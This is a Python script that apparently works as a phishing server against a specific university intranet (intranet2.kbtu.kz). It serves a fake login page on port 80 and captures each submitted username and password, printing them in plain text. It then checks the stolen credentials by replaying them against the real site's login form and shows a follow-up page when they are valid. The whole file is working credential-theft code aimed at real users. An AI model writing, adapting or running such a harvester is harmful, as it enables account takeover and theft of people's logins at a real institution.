import http.server
import socketserver
from http import client

PORT = 80
login_html = open('login.html','rb').read()
t_html = open('3.html','rb').read()
uber_html = open('index.html','rb').read()

def check(login,pwd):
	r = client.HTTPConnection('intranet2.kbtu.kz',80)
	r.putrequest('GET','/login.aspx',True,True)
	r.putheader('Host', 'intranet2.kbtu.kz')
	r.putheader('User-Agent', 'Mozilla/5.0')
	r.endheaders('')
	r.send('')
	data = r.getresponse()
	data1 = str(data.headers)
	print(data1)
	if "Set-Cookie:" in data1:
		l1 = data1.index("Set-Cookie:")
		r1 = data1.index('; path=/')
		cook = str(data1[l1+12:r1])
		r = client.HTTPConnection('intranet2.kbtu.kz',80)
		r.putrequest('POST','/login.aspx',True,True)#POST
		r.putheader('Host', 'intranet2.kbtu.kz')#host
		r.putheader('User-Agent', 'Mozilla/5.0')#user-agent
		r.putheader('Cookie',cook)#cookie
		post = 'uname={0}&pwd={1}'.format(login,pwd)
		r.putheader('Content-Length',str(len(post)))#c-len
		r.putheader('Content-Type','application/x-www-form-urlencoded')#c-type
		r.endheaders(post.encode('ascii'))
		r.send('')
		data = r.getresponse()
		data1 = str(data.headers)
		if 	"Set-Cookie:" in data1:
			return True
		else:
			return False
	else:
		return False

class Handler(http.server.BaseHTTPRequestHandler):
	def do_HEAD(self):
		self.send_response(200)
		self.send_header("Content-type","text/html")
		self.end_headers()
		for i in self.headers:
			print(i+" : "+self.headers[i])


	def do_GET(self):
		self.send_response(200)
		self.send_header("Content-type","text/html")
		self.end_headers()
		self.wfile.write(login_html)
		for i in self.headers:
			print(i+" : "+self.headers[i])



	def do_POST(self):
		self.send_response(200)
		self.send_header("Content-type","text/html")
		self.end_headers()
		lenth = int(self.headers['Content-Length'])
		post = self.rfile.read(lenth).decode('ascii')
		l = post.index('&password=')
		login = str(post[6:l])
		password = str(post[l+10:])
		print(login+':'+password)
		if check(login,password):
			self.wfile.write(uber_html)
		else:
			self.wfile.write(login_html)
		for i in self.headers:
			print(i+" : "+self.headers[i])

httpd = socketserver.TCPServer(('', PORT), Handler)

print("at port :",PORT)
httpd.serve_forever()